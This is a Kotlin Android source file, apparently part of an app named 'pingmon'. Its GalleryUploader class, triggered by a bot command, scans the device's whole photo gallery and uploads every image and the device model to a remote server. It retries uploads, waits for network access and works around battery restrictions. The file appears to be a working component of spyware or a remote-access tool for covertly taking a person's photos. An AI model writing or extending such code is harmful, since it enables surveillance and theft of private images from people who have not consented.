package com.example.pingmon

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Gallery uploader — ID-based deduplication, server is the source of truth.
 *
 * Flow:
 *   1. Scan MediaStore → list of {id, uri, name}
 *   2. POST /gallery/diff with all IDs → server returns only missing ones
 *   3. Upload each missing photo (idempotent — safe to retry)
 *   4. POST /gallery/done → server marks complete or partial
 *
 * No SharedPreferences state needed — server tracks everything.
 * Safe for concurrent commands — runs on its own Thread.
 */
class GalleryUploader(private val ctx: Context) {

    companion object {
        private const val TAG = "GalleryUpload"
        val isRunning = AtomicBoolean(false)
    }

    private val uid    = PingService.uid(ctx)
    private val prefs  = ctx.getSharedPreferences(PingService.PREFS, Context.MODE_PRIVATE)
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(90, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    /** Start upload (or resume). Called by cmd_gallery. */
    fun start() {
        if (isRunning.getAndSet(true)) { Log.w(TAG, "already running"); return }
        Thread({ try { run() } finally { isRunning.set(false) } }, "gallery").start()
    }

    /** Re-check for new photos. Same as start() — server handles dedup. */
    fun refresh() = start()

    private fun run() {
        val server = PingService.serverUrl(ctx)
        if (server.isBlank()) { report("No server set. Use /setserver in bot."); return }

        // 1. Scan local gallery
        val photos = scanGallery()
        if (photos.isEmpty()) { report("No photos found on device."); return }

        val allIds = photos.map { it.id.toString() }

        // 2. Ask server which IDs it's missing
        val diff = requestDiff(server, allIds, photos.size) ?: run {
            report("Could not reach server.")
            return
        }
        val newIds    = diff.newIds
        val uploaded  = diff.uploaded
        val total     = diff.total

        if (newIds.isEmpty()) {
            report("No new photos. Server has all $uploaded/$total. Use ZIP button to re-send.")
            return
        }

        report("Starting: $uploaded/$total already on server. Uploading ${newIds.size} new...")
        Log.i(TAG, "diff: ${newIds.size} new, $uploaded already uploaded, $total total")

        // 3. Build a lookup map for quick URI access
        val photoMap = photos.associateBy { it.id.toString() }

        var sent   = 0
        var failed = 0

        for (id in newIds) {
            val photo = photoMap[id] ?: continue

            // Small delay every 20 photos — MIUI battery killer mitigation
            if ((sent + failed) > 0 && (sent + failed) % 20 == 0) Thread.sleep(200)

            try {
                val bytes = ctx.contentResolver
                    .openInputStream(photo.uri)?.use { it.readBytes() }
                if (bytes == null || bytes.isEmpty()) { failed++; continue }

                val ok = uploadPhoto(server, id, photo.name, bytes)
                if (ok) sent++ else failed++
            } catch (e: Exception) {
                failed++
                Log.w(TAG, "photo $id: ${e.message}")
            }
        }

        // 4. Notify server we're done
        val finalUploaded = uploaded + sent
        markDone(server, finalUploaded, total, failed)

        val msg = if (failed == 0)
            "Gallery complete: $finalUploaded/$total photos on server."
        else
            "Gallery partial: $sent new uploaded, $failed failed. Press Gallery to retry."
        report(msg)
    }

    /* ─────────────────────────────────────────── API calls ── */

    private data class DiffResult(val newIds: List<String>, val uploaded: Int, val total: Int)

    private fun requestDiff(server: String, allIds: List<String>, total: Int): DiffResult? {
        return try {
            val body = JSONObject().apply {
                put("uid",    uid)
                put("device", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                put("ids",    JSONArray(allIds))
            }.toString()
            val req = Request.Builder()
                .url("$server/gallery/diff")
                .addHeader("X-Token", PingService.APP_TOKEN)
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val json = JSONObject(resp.body?.string() ?: return null)
                val newIds = json.optJSONArray("new_ids")
                    ?.let { arr -> (0 until arr.length()).map { arr.getString(it) } }
                    ?: emptyList()
                DiffResult(
                    newIds    = newIds,
                    uploaded  = json.optInt("uploaded", 0),
                    total     = json.optInt("total", total),
                )
            }
        } catch (e: Exception) {
            Log.w(TAG, "diff: ${e.message}")
            null
        }
    }

    private fun isOnline(): Boolean {
        val cm   = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE)
            as android.net.ConnectivityManager
        val n    = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(n) ?: return false
        return caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun waitForOnline() {
        while (!isOnline()) {
            Log.i(TAG, "offline — waiting...")
            Thread.sleep(5_000)
        }
    }

    private fun uploadPhoto(server: String, id: String, name: String, bytes: ByteArray): Boolean {
        // Auto-retry 3 times with backoff, pause/resume on network change
        var attempt = 0
        while (attempt < 3) {
            waitForOnline()
            try {
                val req = Request.Builder()
                    .url("$server/gallery/upload")
                    .addHeader("X-Token",    PingService.APP_TOKEN)
                    .addHeader("X-UID",      uid)
                    .addHeader("X-ID",       id)
                    .addHeader("X-Filename", name.replace(Regex("[^a-zA-Z0-9._-]"), "_"))
                    .post(bytes.toRequestBody("image/jpeg".toMediaType()))
                    .build()
                val ok = client.newCall(req).execute().use { it.isSuccessful }
                if (ok) return true
                attempt++
                if (attempt < 3) Thread.sleep(2_000L * attempt)
            } catch (e: Exception) {
                Log.w(TAG, "upload $id attempt $attempt: ${e.message}")
                attempt++
                if (attempt < 3) Thread.sleep(3_000L * attempt)
            }
        }
        return false
    }

    private fun markDone(server: String, uploaded: Int, total: Int, failed: Int) {
        try {
            val body = JSONObject().apply {
                put("uid",      uid)
                put("uploaded", uploaded)
                put("total",    total)
                put("failed",   failed)
            }.toString()
            val req = Request.Builder()
                .url("$server/gallery/done")
                .addHeader("X-Token", PingService.APP_TOKEN)
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { }
        } catch (e: Exception) { Log.w(TAG, "done: ${e.message}") }
    }

    private fun report(msg: String) {
        prefs.edit().putString("pending_report", msg).apply()
    }

    /* ─────────────────────────────────────── MediaStore scan ── */

    data class Photo(val id: Long, val uri: Uri, val name: String)

    private fun scanGallery(): List<Photo> {
        val list = mutableListOf<Photo>()
        val col  = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        else
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        ctx.contentResolver.query(
            col,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
            null, null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )?.use { c ->
            val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (c.moveToNext()) {
                val id   = c.getLong(idCol)
                val name = c.getString(nameCol) ?: "img_$id.jpg"
                list.add(Photo(id, ContentUris.withAppendedId(col, id), name))
            }
        }
        return list
    }
}
